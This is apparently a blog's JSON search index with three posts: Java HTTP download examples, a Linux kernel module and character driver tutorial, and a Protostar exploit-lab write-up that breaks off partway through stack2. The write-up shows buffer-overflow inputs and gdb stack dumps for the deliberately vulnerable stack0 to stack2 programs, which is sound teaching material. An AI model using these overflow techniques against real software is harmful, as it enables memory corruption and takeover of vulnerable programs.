DataInputStream input = new DataInputStream(client.getInputStream()); output.println(\"GET /Uploads/Campus/BITS_Dubai_campus_logo.gif HTTP/1.1\"); output.println(\"Host: www.bits-pilani.ac.in\"); output.println(); output.flush(); FileOutputStream img = new FileOutputStream(new File(\"img.gif\")); byte[] rec = new byte[2048]; boolean eohfound = false; int count; while((count=input.read(rec))!=-1) { int start = 0; if(!eohfound) { String yu = new String(rec, 0, count); int index = yu.indexOf(\"\\\\r\\\\n\\\\r\\\\n\"); if(index!=-1) { start = index + 4; count = count - index - 4; eohfound = true; } else count = 0; } img.write(rec, start, count); } img.close(); input.close(); output.close(); client.close(); }}Banner Grabbing - HttpURLConnectionimport java.util.*;import java.net.*;import java.io.*;public class httprequest{ public static void main(String[] args) throws Exception { String url = \"&lt;http://www.java2s.com&gt;\"; URL object = new URL(url); HttpURLConnection connection = (HttpURLConnection)object.openConnection(); connection.setRequestMethod(\"GET\"); BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream())); String line; while((line=in.readLine())!=null) { System.out.println(line); System.out.flush(); } }}Download Image using HttpURLConnectionimport java.util.*;import java.net.*;import java.io.*;public class httprequest_download{ public static void main(String[] args) throws Exception { URL object = new URL(\"&lt;http://bits-pilani.ac.in/Uploads/Campus/BITS_Dubai_campus_logo.gif&gt;\"); HttpURLConnection connection = (HttpURLConnection)object.openConnection(); connection.setRequestMethod(\"GET\"); FileOutputStream webpage = new FileOutputStream(new File(\"img.gif\")); DataInputStream in = new DataInputStream(connection.getInputStream()); int count; byte[] buffer = new byte[2048]; while((count = in.read(buffer))!=-1) { webpage.write(buffer, 0, count); webpage.flush(); } in.close(); webpage.close(); }}" }, { "title": "Linux Device Drivers", "url": "/blog/posts/linux-device-drivers/", "categories": "Computers and Fun", "tags": "linux, drivers, kernel", "date": "2019-09-12 03:00:00 -0400", "snippet": "This is a practical study I made using some videos and written resources to understand device drivers to some extent.Building a moduleDevice drivers hide the details of how the device works. User a...", "content": "This is a practical study I made using some videos and written resources to understand device drivers to some extent.Building a moduleDevice drivers hide the details of how the device works. User activities are performed by standardized calls that are independent of the specific driver. Device drivers map these calls to device-specific operations that act in real hardware. Drivers can be integrated into the kernel as well as built separately and dynamically loaded at runtime when needed. These are called loadable modules. Linux looks at device drivers in three different fundamental types - Character devices Block devices Network devicesCharacter device is one that can be accessed as a stream for bytes. Uses a char driver. Eg Keyboard, mouse, camera, etc. Most char devices are just data channels which can be accessed sequentially. Block devices are those which has a file system on it i.e., we can create files and directories and there is an option of moving back and forth. Reads from block devices are in chunks or blocks of data. Eg. pen drive, disks, etc.Making of a simple dynamically loadable program driver which can be added and removed. example.c -#include&lt;linux/init.h&gt;#include&lt;linux/module.h&gt;int simplemod_init(void){ printk(KERN_ALERT \"inside %s function\\\\n\", __FUNCTION__); return 0;}void simplemod_exit(void){ printk(KERN_ALERT \"inside %s function\\\\n\", __FUNCTION__);}module_init(simplemod_init);module_exit(simplemod_exit);The init function gets called when the module is inserted/loaded in the kernel space. Module can be initialized here. The exit function is called when the module is removed/unloaded. Cleanups can be performed here. Last two lines are helper modules to identify the functions.For a simple module to be compiled om a linux system, we need to have a build directory on which we will execute the module. Requirement is the kernel build directory for the version of the kernel running on the machine. To do that type on terminal -uname -rWe need the directory which contains the binary for the returned version of linux. Therefore, to compile the module we make a makefile. Makefile -obj-m:=example.oThis states a need to build a module (m for module). It then generates the specified .o file from the corresponding .c file and then generates the .ko file from the .o file. := is used to initialize the obj-m list of files to be compiled to a string on the right hand side. += is used to add to the obj-m list of files to be compiled. To build the module, type on terminal -make -C /lib/modules/$(uname -r)/build M=$PWD modules -C is to change the directory to the /lib/module/&lt;running kernel&gt;/build directory. The make utility goes to the specified directory and pickup the makefile from there which would contain all info about processor, compilers to be used, optimization done to the kernel, etc. But we need to build the own module, not the kernel. So we specify M=$PWD which specifies to pickup the makefile from the present working directory. The modules in the end specifies what to do (build a module). We see the result as -make: Entering directory '/usr/src/linux-headers-4.13.0-26-generic' CC [M] /home/asus/TANISHQ/example.o Building modules, stage 2. MODPOST 1 modules CC /home/asus/TANISHQ/example.mod.o LD [M] /home/asus/TANISHQ/example.komake: Leaving directory '/usr/src/linux-headers-4.13.0-26-generic'We would now have a file by the name example.ko which is a kernel object. This is the driver that will be inserted into kernel space. To insert this module we use a utility called insmod. It places the module from storage into the kernel space.sudo insmod ./example.kosudo is used as we are changing something in the kernel space. The command will simply return. To check if the module is loaded, type command -lsmod | grep exampleThis returns something like -example 16384 0To remove the module, we use rmmod as -sudo rmmod exampleThe final prints will appear on log files.sudo cat /var/log/syslog | grep insideThis gives result Jan 24 19:59:57 asus kernel: [ 7803.715538] inside simple_module_init function Jan 24 20:00:13 asus kernel: [ 7819.304305] inside simple_module_exit functionTo see the effects of init and exit functions, create two files exmod_init.c and exmod_exit.c, each having only the init and the exit functions respectively.#include&lt;linux/init.h&gt;#include&lt;linux/module.h&gt;int simple_module_init(void){ printk(KERN_ALERT \"Inside %s function\\\\n\",__FUNCTION__); return 0;}module_init(simple_module_init);#include&lt;linux/init.h&gt;#include&lt;linux/module.h&gt;void simple_module_exit(void){ printk(KERN_ALERT \"Inside %s function\\\\n\",__FUNCTION__);}module_exit(simple_module_exit);Edit the Makefile to -obj-m:=example.oobj-m += exmod_init.oobj-m += exmod_exit.oNow after running the same make command, the result is -make -C /lib/modules/$(uname -r)/build M=$PWD modulesmake: Entering directory '/usr/src/linux-headers-4.13.0-26-generic' CC [M] /home/asus/Tanishq/devdr2/example.o CC [M] /home/asus/Tanishq/devdr2/exmod_init.o CC [M] /home/asus/Tanishq/devdr2/exmod_exit.o Building modules, stage 2. MODPOST 3 modules CC /home/asus/Tanishq/devdr2/example.mod.o LD [M] /home/asus/Tanishq/devdr2/example.ko CC /home/asus/Tanishq/devdr2/exmod_exit.mod.o LD [M] /home/asus/Tanishq/devdr2/exmod_exit.ko CC /home/asus/Tanishq/devdr2/exmod_init.mod.o LD [M] /home/asus/Tanishq/devdr2/exmod_init.komake: Leaving directory '/usr/src/linux-headers-4.13.0-26-generic'Now there are kernel modules for the two new files as well. On loading the exmod_exit.ko module, we do not get an alert after loading as there is no init function. On removing it, we get the required alert as there is an exit function.Jan 25 01:24:16 asus kernel: [ 4316.859080] Inside simple_module_exit functionOn loading the exmod_init.ko module, we get the desired alert as there is an init function.Jan 25 01:25:21 asus kernel: [ 4381.815867] Inside simple_module_init functionBut on using rmmod on the module we get an error as there is no exit function.rmmod: ERROR: ../libkmod/libkmod-module.c:793 kmod_module_remove_module() could not remove 'exmod_init': Device or resource busyrmmod: ERROR: could not remove module exmod_init: Device or resource busyThis module then continues to exist in the running modules list which can be checked using the lsmod command.(This module is automatically unloaded after a reboot.)Building module using multiple files and module license and __initFor using multiple c files, edit the makefile to add a ruleobj-m := multimodule.omultimodule.obj$ := exmod_init.o exmod_exit.oThe last line tells what files to use to build the multifile module. Also using := again has reset the name from example.o to multimodule.o. Now to make the module, run -!maketo run the previous run command for make. Now using insmod and rmmod gives the desired results.Add a line to example.c -MODULE_LICENSE(\"GPL\");after the header file inclusion lines. Without this line, the kernel assumes that we have a proprietary or private license for which we are not willing to share the source code. On running without this line the log consists of a lineJan 29 01:48:05 asus-p8z77v kernel: [ 95.022260] example: loading out-of-tree module taints kernel.Jan 29 01:48:05 asus-p8z77v kernel: [ 95.022263] example: module license 'unspecified' taints kernel.Jan 29 01:48:05 asus-p8z77v kernel: [ 95.022264] Disabling lock debugging due to kernel taintJan 29 01:48:05 asus-p8z77v kernel: [ 95.022312] example: module verification failed: signature and/or required key missing - tainting kernelThe kernel thinks that the code is something that can potentially damage the kernel. Also some functionalities of the kernel will not be available without specifying the license (like lock debugging see above and USB support, etc.). Add __init before declaring the init function -__init int simplemod_init(void)The init function is only required to be called when the insmod function is called. After the insmod returns the init function is never going to be called again in the duration of the module. By specifying __init, we indicate that the function is only required when initialization is done. After that the module is not required to be present in the kernel space to save more space in RAM. So this releases some memory of the kernel RAM which can be used for some other purpose. So copy this to another file called example2.c. Add a loop to the example.c file -#include&lt;linux/init.h&gt;#include&lt;linux/module.h&gt;__initdata int count = 5;__init int simplemod_init(void){ printk(KERN_ALERT \"inside %s function\\\\n\", __FUNCTION__); int index; for(index = 0; index &lt; count; index++) { printk(KERN_ALERT \"Index = %d\\\\n\", index); } return 0;}void simplemod_exit(void){ printk(KERN_ALERT \"inside %s function\\\\n\", __FUNCTION__);}module_init(simplemod_init);module_exit(simplemod_exit);In the above code snippet, the value of the global variable count is used only by the init function, so to free up that space used by it after the execution of the insmod command, we use __initdata prefix.kernel difference (min size etc.)The __init can be prefixed on some user defined functions as well but we need to make sure that the function is only invoked by the init function. If a function is declared __init and is also being called by the exit function, then on exiting when the call is made to the function which is not actually present in the RAM, the kernel experiences a page fault and therefore crashes. The output regarding size difference between modules written by same code except for the __init declared function.example2 12390 0example 12442 0Exporting symbolsAdd a function called mod_symbolex to the example code.#include&lt;linux/init.h&gt;#include&lt;linux/module.h&gt;int mod_symbolex(void){ printk(KERN_ALERT \"inside %s function\\\\n\", __FUNCTION__); return 0;}EXPORT_SYMBOL(mod_symbolex);int simplemod_init(void){ printk(KERN_ALERT \"inside %s function\\\\n\", __FUNCTION__); return 0;}void simplemod_exit(void){ printk(KERN_ALERT \"inside %s function\\\\n\", __FUNCTION__);}module_init(simplemod_init);module_exit(simplemod_exit);The EXPORT_SYMBOL macro takes a name which can be a variable or a function which can be exported from this module to any other module in the kernel space. On a new module.c file, call the function and also declare a prototype.#include&lt;linux/init.h&gt;#include&lt;linux/module.h&gt;int mod_symbolex(void);int simplemod_init(void){ printk(KERN_ALERT \"inside %s function\\\\n\", __FUNCTION__); mod_symbolex(); return 0;}void simplemod_exit(void){ printk(KERN_ALERT \"inside %s function\\\\n\", __FUNCTION__);}module_init(simplemod_init);module_exit(simplemod_exit);On loading the module use.ko then export.ko, we get the errorinsmod: ERROR: could not insert module ./use.ko: Unknown symbol in modulebecause the function used in that module isn’t present in the kernel space. Therefore, we need to load the module export.ko first.use 16384 0export 16384 1 useThe log file also contains the respective function names.Module parametersModule parameters are the arguments given to a module. To use this functionality we need to add a header file linux/moduleparam.h. Make a C source file -#include&lt;linux/init.h&gt;#include&lt;linux/module.h&gt;#include&lt;linux/moduleparam.h&gt;int count=1;module_param(count, int, 0);int simplemod_init(void){ int i=0; printk(KERN_ALERT \"inside %s function\\\\n\", __FUNCTION__); for(i = 0;i&lt;count;i++) printk(KERN_ALERT \"hi %d\\\\n\", i); return 0;}void simplemod_exit(void){ printk(KERN_ALERT \"inside %s function\\\\n\", __FUNCTION__);}module_init(simplemod_init);module_exit(simplemod_exit);module_param is a macro which takes three arguments - variable name, size and permission. If we load the module now, hi will be printed once. We can give the variable count as an argument in the following manner -sudo insmod module.ko count=5The name of the variable given as a argument should match the name specified in the module_param function. It is optional to pass a module parameter and so should have a default value. The permission’s use can be demonstrated using code -#include&lt;linux/init.h&gt;#include&lt;linux/module.h&gt;#include&lt;linux/moduleparam.h&gt;int count=1;module_param(count, int, 0644);int simplemod_init(void){ int i=0; printk(KERN_ALERT \"inside %s function\\\\n\", __FUNCTION__); for(i = 0;i&lt;count;i++) printk(KERN_ALERT \"hi %d\\\\n\", i); return 0;}void simplemod_exit(void){ int i=0; printk(KERN_ALERT \"inside %s function\\\\n\", __FUNCTION__); for(i = 0;i&lt;count;i++) printk(KERN_ALERT \"bye %d\\\\n\", i);}module_init(simplemod_init);module_exit(simplemod_exit);The permission format is the same as the unix permission format. The advantage is that now a variable store file is created in the location /sys/module/&lt;modulename&gt;/parameters/count. Since it has the permissions 644, we can edit it while the module is loaded. So if we edit this to 5, and then remove the module, then the message bye will be printed 5 times.Simple character driver module/dev is an in-RAM file system that gets destroyed on reboot. The symbolic links to all devices on the system reside here. On listing the directory we get first character as c for character devices. The two numbers separated by a , are the major number and minor number. Major number is a way of identifying a driver which can be associated with a device. The minor number corresponds to instances of that device. Make a file example.c -#include&lt;linux/init.h&gt;#include&lt;linux/module.h&gt;#include&lt;linux/fs.h&gt;ssize_t example_read(struct file *pfile, char __user *buffer, size_t length, loff_t *offset){ printk(KERN_ALERT \"inside %s function\\\\n\", __FUNCTION__); return 0;}ssize_t example_write(struct file *pfile, const char __user *buffer, size_t length, loff_t *offset){ printk(KERN_ALERT \"inside %s function\\\\n\", __FUNCTION__); return length;}int example_open(struct inode *pinode, struct file *pfile){ printk(KERN_ALERT \"inside %s function\\\\n\", __FUNCTION__); return 0;}int example_close(struct inode *pinode, struct file *pfile){ printk(KERN_ALERT \"inside %s function\\\\n\", __FUNCTION__); return 0;}struct file_operations example_file_operations={ .owner=THIS_MODULE, .open=example_open, .read=example_read, .write=example_write, .release=example_close};int simplemod_init(void){ printk(KERN_ALERT \"inside %s function\\\\n\", __FUNCTION__); register_chrdev(240, \"simplechrdev\", &amp;example_file_operations); return 0;}void simplemod_exit(void){ printk(KERN_ALERT \"inside %s function\\\\n\", __FUNCTION__); unregister_chrdev(240, \"simplechrdev\");}module_init(simplemod_init);module_exit(simplemod_exit);fs.h header file is used for support of character driver support. register_chrdev() is a function used to indicate to the kernel that this is a character device driver. It takes in arguments major number, name of the driver and the file operations. In the exit function we also need to deregister the driver. The struct is specified in the fs.h library. example_operation is the name given to the operation in that structure. The operations function prototypes are taken from the /lib/modules/$(uname -r)/build/include/linux/fs.h file. On the newer kernel the same file can be found in /usr/src/linux-headers-4.13.0-32/include/linux/fs.h. From these prototypes name the functions accordingly and specify names for the parameters. The open and close functions return 0 to indicate successful opening and closing of the files. The read returns 0 to indicate there is no data to return and read was successful. The write returns length to specify the length of data that has been written. There is also a command - make -C /lib/modules/$(uname -r)/build M=$PWD clean to remove all the clutter generated while building the module. Build the character driver module and insert. The device drivers loaded on a system are given in /proc/devices.cat /proc/devicesThis shows character device drivers first followed by the block device drivers. The first column is the major number and the second is the name for the driver. Output -116 alsa128 ptm136 pts180 usb189 usb_device204 ttyMAX216 rfcomm226 drm240 simplechrdev243 media244 mei245 kfdNow we need to define a new device in /dev.sudo mknod -m 666 /dev/mychar_device c 240 0The last 0 is the minor number. The command cat basically opens a file and then reads the contents to display on STDOUT and then closes it. Since, linux does not differentiate between files and character devices, we can run cat command on the device and expect it to open the device, read it then close it. The output in /var/log/syslog shows this behavior. All the expected functions are called. The same can be done using echo command to write to the device (file, as linux treats it).echo hello &gt; /dev/mychar_deviceOutput -Feb 2 22:08:43 Kubuntu-TR kernel: [42655.790679] inside simplemod_init functionFeb 2 22:10:39 Kubuntu-TR kernel: [42771.911791] inside example_open functionFeb 2 22:10:39 Kubuntu-TR kernel: [42771.911821] inside example_read functionFeb 2 22:10:39 Kubuntu-TR kernel: [42771.911842] inside example_close functionFeb 2 22:10:53 Kubuntu-TR kernel: [42785.883620] inside example_open functionFeb 2 22:10:53 Kubuntu-TR kernel: [42785.883651] inside example_write functionFeb 2 22:10:53 Kubuntu-TR kernel: [42785.883660] inside example_close functionFeb 2 22:11:10 Kubuntu-TR kernel: [42802.109737] inside simplemod_exit function" }, { "title": "Exploit Exercises Protostar Lab Write-Up", "url": "/blog/posts/exploit-exercises-protostar/", "categories": "Lab Practice Notes, Misc", "tags": "binary-exploitation, assembly, lab, exploit-exercises", "date": "2019-08-12 03:00:00 -0400", "snippet": "Stack 0#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv){ volatile int modified; char buffer[64]; modified = 0; gets(buffer); ...", "content": "Stack 0#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv){ volatile int modified; char buffer[64]; modified = 0; gets(buffer); if(modified != 0) { printf(\"you have changed the 'modified' variable\\\\\\\\n\"); } else { printf(\"Try again?\\\\\\\\n\"); }}The variable modified needs to be changed to pass the level. The program expects an input. Using gdb to disassemble -(gdb) set disassembly-flavor intel(gdb) disas mainDump of assembler code for function main:0x080483f4 &lt;main+0&gt;: push ebp0x080483f5 &lt;main+1&gt;: mov ebp,esp0x080483f7 &lt;main+3&gt;: and esp,0xfffffff00x080483fa &lt;main+6&gt;: sub esp,0x600x080483fd &lt;main+9&gt;: mov DWORD PTR [esp+0x5c],0x00x08048405 &lt;main+17&gt;: lea eax,[esp+0x1c]0x08048409 &lt;main+21&gt;: mov DWORD PTR [esp],eax0x0804840c &lt;main+24&gt;: call 0x804830c &lt;gets@plt&gt;0x08048411 &lt;main+29&gt;: mov eax,DWORD PTR [esp+0x5c]0x08048415 &lt;main+33&gt;: test eax,eax0x08048417 &lt;main+35&gt;: je 0x8048427 &lt;main+51&gt;0x08048419 &lt;main+37&gt;: mov DWORD PTR [esp],0x80485000x08048420 &lt;main+44&gt;: call 0x804832c &lt;puts@plt&gt;0x08048425 &lt;main+49&gt;: jmp 0x8048433 &lt;main+63&gt;0x08048427 &lt;main+51&gt;: mov DWORD PTR [esp],0x80485290x0804842e &lt;main+58&gt;: call 0x804832c &lt;puts@plt&gt;0x08048433 &lt;main+63&gt;: leave 0x08048434 &lt;main+64&gt;: ret End of assembler dump.(gdb) break *0x0804840cBreakpoint 1 at 0x804840c: file stack0/stack0.c, line 11.(gdb) break *0x08048415Breakpoint 2 at 0x8048415: file stack0/stack0.c, line 13.The program is disassembled and the instructions can be mapped with the given c code to find out the location of the variable ‘modified’ which is at esp + x5c. The input is accepted at the gets function which has a vulnerability of accepting more than the buffer size declared. Adding breakpoints before gets function call and before the compare helps in analysis.(gdb) rStarting program: /opt/protostar/bin/stack0Breakpoint 1, 0x0804840c in main (argc=1, argv=0xbffff864) at stack0/stack0.c:1111 stack0/stack0.c: No such file or directory. in stack0/stack0.c(gdb) x/24wx $esp0xbffff750: 0xbffff76c 0x00000001 0xb7fff8f8 0xb7f0186e0xbffff760: 0xb7fd7ff4 0xb7ec6165 0xbffff778 0xb7eada750xbffff770: 0xb7fd7ff4 0x08049620 0xbffff788 0x080482e80xbffff780: 0xb7ff1040 0x08049620 0xbffff7b8 0x080484690xbffff790: 0xb7fd8304 0xb7fd7ff4 0x08048450 0xbffff7b80xbffff7a0: 0xb7ec6365 0xb7ff1040 0x0804845b 0x00000000The 0x0000000 is the value of the variable of concern. This needs to be modified. Entering c to continue execution and entering a bunch of A’s to locate them on the stack.(gdb) cContinuing.AAAAAAAAAAAAAAAAAAAAAAAAAAAAABreakpoint 2, 0x08048415 in main (argc=1, argv=0xbffff864) at stack0/stack0.c:1313 in stack0/stack0.c(gdb) x/24wx $esp0xbffff750: 0xbffff76c 0x00000001 0xb7fff8f8 0xb7f0186e0xbffff760: 0xb7fd7ff4 0xb7ec6165 0xbffff778 0x414141410xbffff770: 0x41414141 0x41414141 0x41414141 0x414141410xbffff780: 0x41414141 0x41414141 0xbfff0041 0x080484690xbffff790: 0xb7fd8304 0xb7fd7ff4 0x08048450 0xbffff7b80xbffff7a0: 0xb7ec6365 0xb7ff1040 0x0804845b 0x00000000The 0x41’s can now be located and the start address can be noted for the A’s. The number of A’s required to overwrite the value of the ‘modified’ variable is calculated as 17 words. Using python to print this and re executing the program, the required output is obtained.(gdb) rThe program being debugged has been started already.Start it from the beginning? (y or n) yStarting program: /opt/protostar/bin/stack0Breakpoint 1, 0x0804840c in main (argc=1, argv=0xbffff864) at stack0/stack0.c:1111 in stack0/stack0.c(gdb) cContinuing.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABreakpoint 2, 0x08048415 in main (argc=1, argv=0xbffff864) at stack0/stack0.c:1313 in stack0/stack0.c(gdb) x/24wx $esp0xbffff750: 0xbffff76c 0x00000001 0xb7fff8f8 0xb7f0186e0xbffff760: 0xb7fd7ff4 0xb7ec6165 0xbffff778 0x414141410xbffff770: 0x41414141 0x41414141 0x41414141 0x414141410xbffff780: 0x41414141 0x41414141 0x41414141 0x414141410xbffff790: 0x41414141 0x41414141 0x41414141 0x414141410xbffff7a0: 0x41414141 0x41414141 0x41414141 0x41414141(gdb) cContinuing.you have changed the 'modified' variableProgram exited with code 051.After this the desired result has been obtained. As clear, the location with 0x0000000 was overwritten with 0x41’s, hence changing the value of the ‘modified’ variable.Stack 1#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv){ volatile int modified; char buffer[64]; if(argc == 1) { errx(1, \"please specify an argument\\\\\\\\n\"); } modified = 0; strcpy(buffer, argv[1]); if(modified == 0x61626364) { printf(\"you have correctly got the variable to the right value\\\\\\\\n\"); } else { printf(\"Try again, you got 0x%08x\\\\\\\\n\", modified); }}The code takes an argument from the command line to use in the program. The variable ‘modified’ needs to be changed by an overflow to 0x61626364. Disassembling the program using gdb -(gdb) disas mainDump of assembler code for function main:0x08048464 &lt;main+0&gt;: push %ebp0x08048465 &lt;main+1&gt;: mov %esp,%ebp0x08048467 &lt;main+3&gt;: and $0xfffffff0,%esp0x0804846a &lt;main+6&gt;: sub $0x60,%esp0x0804846d &lt;main+9&gt;: cmpl $0x1,0x8(%ebp)0x08048471 &lt;main+13&gt;: jne 0x8048487 &lt;main+35&gt;0x08048473 &lt;main+15&gt;: movl $0x80485a0,0x4(%esp)0x0804847b &lt;main+23&gt;: movl $0x1,(%esp)0x08048482 &lt;main+30&gt;: call 0x8048388 &lt;errx@plt&gt;0x08048487 &lt;main+35&gt;: movl $0x0,0x5c(%esp)0x0804848f &lt;main+43&gt;: mov 0xc(%ebp),%eax0x08048492 &lt;main+46&gt;: add $0x4,%eax0x08048495 &lt;main+49&gt;: mov (%eax),%eax0x08048497 &lt;main+51&gt;: mov %eax,0x4(%esp)0x0804849b &lt;main+55&gt;: lea 0x1c(%esp),%eax0x0804849f &lt;main+59&gt;: mov %eax,(%esp)0x080484a2 &lt;main+62&gt;: call 0x8048368 &lt;strcpy@plt&gt;0x080484a7 &lt;main+67&gt;: mov 0x5c(%esp),%eax0x080484ab &lt;main+71&gt;: cmp $0x61626364,%eax0x080484b0 &lt;main+76&gt;: jne 0x80484c0 &lt;main+92&gt;0x080484b2 &lt;main+78&gt;: movl $0x80485bc,(%esp)0x080484b9 &lt;main+85&gt;: call 0x8048398 &lt;puts@plt&gt;0x080484be &lt;main+90&gt;: jmp 0x80484d5 &lt;main+113&gt;0x080484c0 &lt;main+92&gt;: mov 0x5c(%esp),%edx0x080484c4 &lt;main+96&gt;: mov $0x80485f3,%eax0x080484c9 &lt;main+101&gt;: mov %edx,0x4(%esp)0x080484cd &lt;main+105&gt;: mov %eax,(%esp)0x080484d0 &lt;main+108&gt;: call 0x8048378 &lt;printf@plt&gt;0x080484d5 &lt;main+113&gt;: leave 0x080484d6 &lt;main+114&gt;: ret End of assembler dump.Adding breakpoints to the strcpy function call before and after to check the contents. From the assembly code, the location is at esp + x5c. Therefore, running with a bunch of A’s for location.(gdb) break *0x080484a2Breakpoint 1 at 0x80484a2: file stack1/stack1.c, line 16.(gdb) break *0x080484a7Breakpoint 2 at 0x80484a7: file stack1/stack1.c, line 18.(gdb) r AAAAAAAAAAAAAAAAAAAAAAStarting program: /opt/protostar/bin/stack1 AAAAAAAAAAAAAAAAAAAAAABreakpoint 1, 0x080484a2 in main (argc=2, argv=0xbffff834) at stack1/stack1.c:1616 stack1/stack1.c: No such file or directory. in stack1/stack1.c(gdb) x/24wx $esp0xbffff720: 0xbffff73c 0xbffff974 0xb7fff8f8 0xb7f0186e0xbffff730: 0xb7fd7ff4 0xb7ec6165 0xbffff748 0xb7eada750xbffff740: 0xb7fd7ff4 0x080496fc 0xbffff758 0x080483340xbffff750: 0xb7ff1040 0x080496fc 0xbffff788 0x080485090xbffff760: 0xb7fd8304 0xb7fd7ff4 0x080484f0 0xbffff7880xbffff770: 0xb7ec6365 0xb7ff1040 0x080484fb 0x00000000(gdb) cContinuing.Breakpoint 2, main (argc=2, argv=0xbffff834) at stack1/stack1.c:1818 in stack1/stack1.c(gdb) x/24wx $esp0xbffff720: 0xbffff73c 0xbffff974 0xb7fff8f8 0xb7f0186e0xbffff730: 0xb7fd7ff4 0xb7ec6165 0xbffff748 0x414141410xbffff740: 0x41414141 0x41414141 0x41414141 0x414141410xbffff750: 0xb7004141 0x080496fc 0xbffff788 0x080485090xbffff760: 0xb7fd8304 0xb7fd7ff4 0x080484f0 0xbffff7880xbffff770: 0xb7ec6365 0xb7ff1040 0x080484fb 0x00000000The A’s are now located. The 0x0000000 entry is the one that needs to be changed. The exact value required to be there is 0x61626364 which needs to be written backwards byte by byte to follow the little endianness. The number of bytes required to change can be counted and the last 4 need to be changed to 0x64636261 using python.(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcbaThe program being debugged has been started already.Start it from the beginning? (y or n) yStarting program: /opt/protostar/bin/stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcbaBreakpoint 1, 0x080484a2 in main (argc=2, argv=0xbffff804) at stack1/stack1.c:1616 in stack1/stack1.c(gdb) x/24wx $esp0xbffff6f0: 0xbffff70c 0xbffff946 0xb7fff8f8 0xb7f0186e0xbffff700: 0xb7fd7ff4 0xb7ec6165 0xbffff718 0xb7eada750xbffff710: 0xb7fd7ff4 0x080496fc 0xbffff728 0x080483340xbffff720: 0xb7ff1040 0x080496fc 0xbffff758 0x080485090xbffff730: 0xb7fd8304 0xb7fd7ff4 0x080484f0 0xbffff7580xbffff740: 0xb7ec6365 0xb7ff1040 0x080484fb 0x00000000(gdb) cContinuing.Breakpoint 2, main (argc=2, argv=0xbffff804) at stack1/stack1.c:1818 in stack1/stack1.c(gdb) x/24wx $esp0xbffff6f0: 0xbffff70c 0xbffff946 0xb7fff8f8 0xb7f0186e0xbffff700: 0xb7fd7ff4 0xb7ec6165 0xbffff718 0x414141410xbffff710: 0x41414141 0x41414141 0x41414141 0x414141410xbffff720: 0x41414141 0x41414141 0x41414141 0x414141410xbffff730: 0x41414141 0x41414141 0x41414141 0x414141410xbffff740: 0x41414141 0x41414141 0x41414141 0x61626364(gdb) cContinuing.you have correctly got the variable to the right valueProgram exited with code 067.Stack 2#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv){ volatile int modified; char buffer[64]; char *variable; //* variable = getenv(\"GREENIE\"); if(variable == NULL) { errx(1, \"please set the GREENIE environment variable\\\\\\\\n\"); } modified = 0; strcpy(buffer, variable); if(modified == 0x0d0a0d0a) { printf(\"you have correctly modified the variable\\\\\\\\n\"); } else { printf(\"Try again, you got 0x%08x\\\\\\\\n\", modified); }}The code has a variable called ‘variable’. This exits with an error if the variable is null. If it is not null then another variable called ‘modified’ is set to 0 after which the variable’s value is copied via strcpy to buffer. Strcpy copies the whole string into the buffer irrespective of the buffer size. Therefore, idea seems to be to set the env variable first to pass first test case then to modify or breach the content area of the variable ‘modified’ in the stack using overflow string as that which is the value of the env variable. Initially setting the env variable to a bunch of A’s to locate easily.user@protostar:~$ export GREENIE=\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"user@protostar:~$ printenv GREENIEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADisassembling the executable in gdb.(gdb) disas mainDump of assembler code for function main:0x08048494 &lt;main+0&gt;: push ebp0x08048495 &lt;main+1&gt;: mov ebp,esp0x08048497 &lt;main+3&gt;: and esp,0xfffffff00x0804849a &lt;main+6&gt;: sub esp,0x600x0804849d &lt;main+9&gt;: mov DWORD PTR [esp],0x80485e00x080484a4 &lt;main+16&gt;: call 0x804837c &lt;getenv@plt&gt;0x080484a9 &lt;main+21&gt;: mov DWORD PTR [esp+0x5c],eax0x080484ad &lt;main+25&gt;: cmp DWORD PTR [esp+0x5c],0x00x080484b2 &lt;main+30&gt;: jne 0x80484c8 &lt;main+52&gt;0x080484b4 &lt;main+32&gt;: mov DWORD PTR [esp+0x4],0x80485e80x080484bc &lt;main+40&gt;: mov DWORD PTR [esp],0x10x080484c3 &lt;main+47&gt;: call 0x80483bc &lt;errx@plt&gt;0x080484c8 &lt;main+52&gt;: mov DWORD PTR [esp+0x58],0x00x080484d0 &lt;main+60&gt;: mov eax,DWORD PTR [esp+0x5c]0x080484d4 &lt;main+64&gt;: mov DWORD PTR [esp+0x4],eax0x080484d8 &lt;main+68&gt;: lea eax,[esp+0x18]0x080484dc &lt;main+72&gt;: mov DWORD PTR [esp],eax0x080484df &lt;main+75&gt;: call 0x804839c &lt;strcpy@plt&gt;0x080484e4 &lt;main+80&gt;: mov eax,DWORD PTR [esp+0x58]0x080484e8 &lt;main+84&gt;: cmp eax,0xd0a0d0a0x080484ed &lt;main+89&gt;: jne 0x80484fd &lt;main+105&gt;0x080484ef &lt;main+91&gt;: mov DWORD PTR [esp],0x80486180x080484f6 &lt;main+98&gt;: call 0x80483cc &lt;puts@plt&gt;0x080484fb &lt;main+103&gt;: jmp 0x8048512 &lt;main+126&gt;0x080484fd &lt;main+105&gt;: mov edx,DWORD PTR [esp+0x58]0x08048501 &lt;main+109&gt;: mov eax,0x80486410x08048506 &lt;main+114&gt;: mov DWORD PTR [esp+0x4],edx0x0804850a &lt;main+118&gt;: mov DWORD PTR [esp],eax0x0804850d &lt;main+121&gt;: call 0x80483ac &lt;printf@plt&gt;0x08048512 &lt;main+126&gt;: leave 0x08048513 &lt;main+127&gt;: ret End of assembler dump.Putting breakpoints before and after the strcpy -(gdb) break *0x080484dfBreakpoint 1 at 0x80484df: file stack2/stack2.c, line 20.(gdb) break *0x080484e4Breakpoint 2 at 0x80484e4: file stack2/stack2.c, line 22.Analysing the assembly code, after the strcpy, the 